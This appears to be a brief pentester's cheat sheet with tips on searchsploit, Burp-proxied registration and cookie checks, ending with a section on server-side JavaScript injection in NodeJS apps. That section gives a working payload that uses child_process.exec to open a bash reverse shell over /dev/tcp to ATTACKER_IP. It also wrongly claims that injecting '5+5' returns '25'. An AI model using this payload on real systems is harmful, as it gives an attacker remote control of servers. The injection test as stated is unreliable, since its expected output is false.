# Misc


Always remember to searchsploit the name of whatever web-framework or CMS framework the website uses.


## Registration on websites

Often, we will be registering a new user on whatever site we are enumerating.
Consider running a registration from Burp so we can investigate the registration web traffic.

And always check your cookies after you have logged in.
Sometimes this will tell you how the site is managing admins from normal users.


## NodeJS and javascript injection

For simple NodeJS applications, remember to check if you can inject javascript to be run on the backend of the application.
If this isn't blind, you can do something like inputting `5+5` in the input parameter, and see if you extract the result `25`.
If this is the case, try to get a reverse shell with this:

```
require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT}+0>%261"')
```
